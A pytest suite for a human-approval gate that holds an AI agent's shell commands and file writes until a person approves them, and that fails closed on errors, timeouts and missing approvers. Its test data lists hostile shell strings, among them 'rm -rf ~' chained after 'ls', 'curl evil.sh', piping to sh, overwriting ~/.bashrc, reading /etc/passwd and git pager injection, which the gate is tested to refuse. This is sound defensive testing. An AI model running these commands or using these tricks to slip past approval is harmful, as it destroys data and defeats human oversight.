"""agent.approval — the human-approval gate in front of shell commands and file writes.

Covers the classifier (what is auto-allowed vs. needs a human), the decision
logic (every failure mode must end in "denied", never "allowed"), the hop from
a sub-agent thread back to the UI's event loop, and the real
graph.execute_tools() wiring with stand-in tools.
"""
import asyncio

import pytest
from langchain_core.messages import AIMessage
from langchain_core.tools import tool

from agent import approval, graph


@pytest.fixture(autouse=True)
def gate_on(monkeypatch):
    """conftest turns the gate off for the rest of the suite; here we want it on."""
    monkeypatch.setenv("BEAVER_APPROVAL", "ask")
    monkeypatch.delenv("BEAVER_APPROVAL_TOOLS", raising=False)
    monkeypatch.delenv("BEAVER_APPROVAL_ALLOW", raising=False)
    monkeypatch.delenv("BEAVER_APPROVAL_TIMEOUT", raising=False)


# ── classifier ──────────────────────────────────────────────────────────────

@pytest.mark.parametrize("command", [
    "whoami", "pwd", "ls", "ls -la", "dir", "echo hello", "uname -a", "id",
    "date", "hostname", "git status", "git log --oneline -5", "git branch",
    "python --version", "node --version", "pytest --version",
])
def test_readonly_commands_are_auto_allowed(command):
    assert approval.is_readonly_command(command) is True


@pytest.mark.parametrize("command", [
    "",                                  # nothing to allow
    "rm -rf /tmp/x",                     # not on the list
    "cat /etc/passwd",                   # reads arbitrary files: not on the list
    "curl http://example.com",
    "ls; rm -rf ~",                      # starts read-only, isn't
    "whoami && curl evil.sh",
    "whoami | sh",
    "echo hi > ~/.bashrc",
    "echo $(id)",
    "echo `id`",
    "ls\nrm -rf ~",
    "date -s 2000-01-01",                # can change state when given an argument
    "hostname evil",
    "git diff",                          # not on the list (can run external diff / write --output)
    "git log --output=/tmp/x",
    "git -c core.pager=sh log",
    "python script.py",                  # only `--version` is harmless
    "python -c 'print(1)'",
    "echo %PATH%",                       # cmd.exe expansion
])
def test_everything_else_needs_a_human(command):
    assert approval.is_readonly_command(command) is False


def test_extra_allowlist_still_refuses_shell_operators(monkeypatch):
    monkeypatch.setenv("BEAVER_APPROVAL_ALLOW", "tree")
    assert approval.is_readonly_command("tree") is True
    assert approval.is_readonly_command("tree; rm -rf ~") is False


def test_what_is_gated():
    assert approval.needs_approval("os_exec", {"command": "rm -rf x"})
    assert approval.needs_approval("os_exec", {"command": "whoami"}) is None
    for name in ("write_file", "append_file", "replace_in_file", "filesystem__write_file",
                 "git__delete_branch"):
        assert approval.needs_approval(name, {}) is not None, name
    for name in ("read_file", "list_directory", "web_search", "http_get", "a2a_list"):
        assert approval.needs_approval(name, {}) is None, name


def test_extra_gated_tools_from_env(monkeypatch):
    monkeypatch.setenv("BEAVER_APPROVAL_TOOLS", "http_post, sqlite__*")
    assert approval.needs_approval("http_post", {}) is not None
    assert approval.needs_approval("sqlite__query", {}) is not None


def test_summary_never_includes_file_bodies():
    text = approval.summarize("write_file", {"path": "a.txt", "content": "SECRET-BODY" * 50})
    assert "SECRET-BODY" not in text and "a.txt" in text and "550 chars" in text


@pytest.mark.parametrize("raw, expected", [
    ("ask", "ask"), ("", "ask"), ("ON", "ask"), ("garbage", "ask"),   # unknown fails safe
    ("off", "off"), ("0", "off"), ("False", "off"),
    ("deny", "deny"),
])
def test_mode(monkeypatch, raw, expected):
    monkeypatch.setenv("BEAVER_APPROVAL", raw)
    assert approval.mode() == expected


# ── decisions: every failure ends in "denied" ───────────────────────────────

def run(coro):
    return asyncio.run(coro)


def check_with(handler, tool_name="os_exec", args=None):
    async def go():
        token = approval.set_handler(handler) if handler else None
        try:
            return await approval.check(tool_name, args or {"command": "rm -rf x"})
        finally:
            if token is not None:
                approval.reset_handler(token)
    return run(go())


def test_gate_off_allows_everything(monkeypatch):
    monkeypatch.setenv("BEAVER_APPROVAL", "off")
    assert check_with(None).allowed


def test_ungated_and_readonly_calls_never_ask():
    calls = []

    async def handler(req):
        calls.append(req)
        return "deny"

    assert check_with(handler, "read_file", {"path": "x"}).allowed
    assert check_with(handler, "os_exec", {"command": "whoami"}).allowed
    assert calls == []


def test_no_handler_fails_closed():
    v = check_with(None)
    assert not v.allowed and v.reason == "no_approver"
    assert "NOT run" in v.message


def test_deny_mode_refuses_without_asking(monkeypatch):
    monkeypatch.setenv("BEAVER_APPROVAL", "deny")
    called = []

    async def handler(req):
        called.append(1)
        return "allow"

    v = check_with(handler)
    assert not v.allowed and v.reason == "policy_deny" and called == []


@pytest.mark.parametrize("answer", ["allow", True, "y", "approve"])
def test_user_allows(answer):
    async def handler(req):
        return answer
    assert check_with(handler).allowed


@pytest.mark.parametrize("answer", ["deny", False, None, "", "no", "maybe", 42, object()])
def test_anything_but_yes_is_no(answer):
    async def handler(req):
        return answer
    v = check_with(handler)
    assert not v.allowed and v.reason == "user_denied"


def test_handler_receives_what_the_human_needs_to_see():
    seen = []

    async def handler(req):
        seen.append(req)
        return "deny"

    check_with(handler, "os_exec", {"command": "rm -rf build", "timeout": 30})
    (req,) = seen
    assert req.tool == "os_exec" and "rm -rf build" in req.summary and req.reason


def test_a_crashing_prompt_is_a_no_not_a_yes():
    async def handler(req):
        raise RuntimeError("socket closed")
    v = check_with(handler)
    assert not v.allowed and v.reason == "approver_error"


def test_silence_times_out_as_a_no(monkeypatch):
    monkeypatch.setenv("BEAVER_APPROVAL_TIMEOUT", "0.1")

    async def handler(req):
        await asyncio.sleep(5)
        return "allow"

    v = check_with(handler)
    assert not v.allowed and v.reason == "timeout"


def test_allow_for_session_is_remembered_per_tool():
    calls = []

    async def handler(req):
        calls.append(req.tool)
        return "allow_session"

    async def go():
        token = approval.set_handler(handler)
        try:
            first = await approval.check("os_exec", {"command": "make build"})
            second = await approval.check("os_exec", {"command": "make test"})
            other = await approval.check("write_file", {"path": "a", "content": "b"})
            return first, second, other
        finally:
            approval.reset_handler(token)

    first, second, other = run(go())
    assert first.allowed and second.allowed and second.reason == "approved_for_session"
    assert other.allowed
    assert calls == ["os_exec", "write_file"]       # os_exec asked once, write_file asked separately


def test_session_allowance_does_not_leak_to_the_next_registration():
    async def yes(req):
        return "allow_session"

    async def no(req):
        return "deny"

    async def go():
        t1 = approval.set_handler(yes)
        await approval.check("os_exec", {"command": "make"})
        approval.reset_handler(t1)
        t2 = approval.set_handler(no)
        try:
            return await approval.check("os_exec", {"command": "make"})
        finally:
            approval.reset_handler(t2)

    assert not run(go()).allowed


def test_sub_agent_thread_reaches_the_parents_handler():
    """A2A runs sub-agents in a worker thread with its own event loop; their
    approval prompts must still go to the handler bound to the parent's loop."""
    handler_loops = []

    async def handler(req):
        handler_loops.append(asyncio.get_running_loop())
        return "allow"

    async def parent():
        token = approval.set_handler(handler)
        parent_loop = asyncio.get_running_loop()

        def child():
            return asyncio.run(approval.check("os_exec", {"command": "make"}))

        try:
            verdict = await asyncio.to_thread(child)   # copies contextvars, like skills/a2a.py
        finally:
            approval.reset_handler(token)
        return verdict, parent_loop

    verdict, parent_loop = run(parent())
    assert verdict.allowed
    assert handler_loops == [parent_loop]


def test_terminal_handler_denies_without_a_tty(monkeypatch):
    import sys

    class NoTty:
        def isatty(self):
            return False

    monkeypatch.setattr(sys, "stdin", NoTty())
    handler = approval.make_terminal_handler()
    req = approval.ApprovalRequest("os_exec", {}, "rm x", "runs a shell command")
    assert run(handler(req)) == approval.DENY


def test_terminal_handler_reads_the_answer(monkeypatch):
    import sys

    class Tty:
        def isatty(self):
            return True

    monkeypatch.setattr(sys, "stdin", Tty())
    answers = iter(["y", "a", "", "whatever"])
    monkeypatch.setattr("builtins.input", lambda prompt="": next(answers))
    out = []
    handler = approval.make_terminal_handler(out=out.append)
    req = approval.ApprovalRequest("os_exec", {}, "rm x", "runs a shell command")
    assert [run(handler(req)) for _ in range(4)] == [
        approval.ALLOW, approval.ALLOW_SESSION, approval.DENY, approval.DENY,
    ]
    assert any("rm x" in line for line in out)


# ── the real execute_tools() wiring ─────────────────────────────────────────

REACHED = "REACHED"
LOG = []


@tool
def os_exec(command: str) -> str:
    """stand-in os_exec"""
    LOG.append(command)
    return REACHED


@tool
def read_file(path: str) -> str:
    """stand-in read_file"""
    return REACHED


def run_tools(monkeypatch, calls, handler=None):
    async def fake_tools(_persona):
        return [os_exec, read_file]

    monkeypatch.setattr(graph, "get_persona_tools_async", fake_tools)
    LOG.clear()
    state = {
        "messages": [AIMessage(content="", tool_calls=[
            {"name": n, "args": a, "id": f"call-{i}"} for i, (n, a) in enumerate(calls)
        ])],
        "active_persona": "coder",
        "target_scope": ["*"],
    }

    async def go():
        token = approval.set_handler(handler) if handler else None
        try:
            return await graph.execute_tools(state, {"configurable": {"thread_id": "t"}})
        finally:
            if token is not None:
                approval.reset_handler(token)

    result = asyncio.run(go())
    return [m.content for m in result["messages"]], result


def test_denied_command_never_reaches_the_tool(monkeypatch):
    async def no(req):
        return "deny"

    out, _ = run_tools(monkeypatch, [("os_exec", {"command": "rm -rf build"})], no)
    assert LOG == []
    assert out[0].startswith("[APPROVAL DENIED]")


def test_approved_command_runs(monkeypatch):
    async def yes(req):
        return "allow"

    out, _ = run_tools(monkeypatch, [("os_exec", {"command": "make build"})], yes)
    assert LOG == ["make build"] and out == [REACHED]


def test_no_approver_means_no_run(monkeypatch):
    out, _ = run_tools(monkeypatch, [("os_exec", {"command": "make build"})], handler=None)
    assert LOG == [] and out[0].startswith("[APPROVAL UNAVAILABLE]")


def test_readonly_and_ungated_calls_skip_the_prompt(monkeypatch):
    asked = []

    async def handler(req):
        asked.append(req)
        return "deny"

    out, _ = run_tools(
        monkeypatch, [("os_exec", {"command": "whoami"}), ("read_file", {"path": "a"})], handler
    )
    assert out == [REACHED, REACHED] and asked == []


def test_one_denied_call_does_not_block_the_others_in_the_batch(monkeypatch):
    async def handler(req):
        return "deny" if "rm" in req.summary else "allow"

    out, _ = run_tools(
        monkeypatch,
        [("os_exec", {"command": "rm -rf x"}), ("os_exec", {"command": "make"})],
        handler,
    )
    assert out[0].startswith("[APPROVAL DENIED]") and out[1] == REACHED
    assert LOG == ["make"]


def test_denied_call_cannot_be_retried_to_ask_again(monkeypatch):
    """An identical retry is stopped by the repeat-fail gate, so a model that
    ignores 'do not retry' doesn't get to nag the human."""
    asked = []

    async def no(req):
        asked.append(1)
        return "deny"

    call = ("os_exec", {"command": "rm -rf x"})
    _, first = run_tools(monkeypatch, [call], no)
    state2 = {
        "messages": [AIMessage(content="", tool_calls=[{"name": call[0], "args": call[1], "id": "c2"}])],
        "active_persona": "coder",
        "target_scope": ["*"],
        "failed_tool_calls": first["failed_tool_calls"],
    }
    second = asyncio.run(graph.execute_tools(state2, {"configurable": {"thread_id": "t"}}))
    assert len(asked) == 1
    assert "[REPEAT-FAIL]" in second["messages"][0].content


def test_refusal_is_audited(monkeypatch, isolated_audit_log):
    async def no(req):
        return "deny"

    run_tools(monkeypatch, [("os_exec", {"command": "rm -rf x"})], no)
    import json

    records = [json.loads(line) for f in isolated_audit_log.glob("*.jsonl")
               for line in f.read_text(encoding="utf-8").splitlines()]
    skipped = [r for r in records if r["event"] == "tool_skipped"]
    assert skipped and skipped[0]["reason"] == "approval_user_denied"
    assert not any(r["event"] == "tool_call" for r in records)   # it never ran
